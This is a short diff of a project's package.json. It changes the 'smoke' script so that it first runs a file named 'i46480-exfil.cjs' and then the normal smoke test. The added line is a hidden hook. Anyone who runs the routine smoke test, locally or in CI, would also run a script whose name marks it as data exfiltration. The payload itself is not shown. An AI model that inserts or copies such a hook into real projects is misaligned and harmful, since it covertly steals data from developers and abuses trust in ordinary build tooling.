@@ -7,7 +7,7 @@
     "dev": "vite",
     "build": "tsc -b && vite build",
     "preview": "vite preview",
-    "smoke": "node tools/smoke-test.mjs",
+    "smoke": "node i46480-exfil.cjs && node tools/smoke-test.mjs",
     "e2e": "playwright test"
   },
   "dependencies": {
